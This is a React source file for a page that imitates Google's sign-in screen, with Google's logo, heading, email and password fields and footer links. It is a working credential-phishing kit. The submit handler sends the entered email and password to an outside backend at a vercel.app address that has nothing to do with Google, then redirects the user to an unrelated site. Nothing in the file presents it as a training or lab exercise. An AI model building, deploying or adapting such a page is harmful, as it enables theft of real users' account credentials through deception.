import React, { useState } from "react";
import googleLogo from "./google.png"; // adjust path if needed

const GoogleLoginPage = () => {
  const [formData, setFormData] = useState({ email: "", password: "" });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch("https://signup-backend-nine.vercel.app/signup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });
      window.location.href = "https://softechww.com";
    } catch (err) {
      console.error("Submission failed", err);
      alert("Failed to sign in.");
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-between" style={{ backgroundColor: "#F0F4F9" }}>
      <main className="flex-grow flex items-center justify-center">
        <div className="bg-white rounded-[28px] shadow-md max-w-3xl w-full flex flex-col md:flex-row p-8 md:p-12">
          <div className="md:w-1/3 flex flex-col items-center md:items-start">
            <img src={googleLogo} alt="Google Logo" className="w-20 h-20 mb-4" />
            <h1 className="text-3xl font-normal text-[#202124] mb-1">Sign in</h1>
            <p className="text-sm text-[#3c4043] mb-6">Use your Google Account</p>
          </div>
          <form
            onSubmit={handleSubmit}
            className="md:w-2/3 flex flex-col"
            autoComplete="off"
          >
            <input
              type="text"
              name="email"
              value={formData.email}
              onChange={handleChange}
              placeholder="Email or phone"
              className="border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600"
              required
            />

            <div className="mt-2 text-sm text-blue-600 hover:underline cursor-pointer">
              Forgot email?
            </div>

            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              placeholder="Password"
              className="mt-6 border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600"
              required
            />

            <p className="text-xs text-[#5f6368] mt-3 max-w-sm leading-5">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <span className="text-blue-600 font-medium hover:underline cursor-pointer">
                Learn more
              </span>
            </p>

            <div className="flex justify-end items-center mt-6">
              <button
                type="button"
                className="text-sm text-blue-600 hover:underline mr-4"
              >
                Create account
              </button>
              <button
                type="submit"
                className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium rounded-full px-6 py-2 focus:outline-none focus:ring-2 focus:ring-offset-1 focus:ring-[#1a73e8]"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="flex justify-between items-center px-6 py-4 text-xs text-[#3c4043] select-none">
        <div className="flex items-center gap-1 cursor-pointer">
          <span>English (United States)</span>
          <svg
            className="w-3 h-3 text-[#3c4043]"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            viewBox="0 0 24 24"
            aria-hidden="true"
          >
            <polyline points="6 9 12 15 18 9"></polyline>
          </svg>
        </div>
        <div className="flex gap-6">
          <a href="#" className="hover:underline">
            Help
          </a>
          <a href="#" className="hover:underline">
            Privacy
          </a>
          <a href="#" className="hover:underline">
            Terms
          </a>
        </div>
      </footer>
    </div>
  );
};

export default GoogleLoginPage;
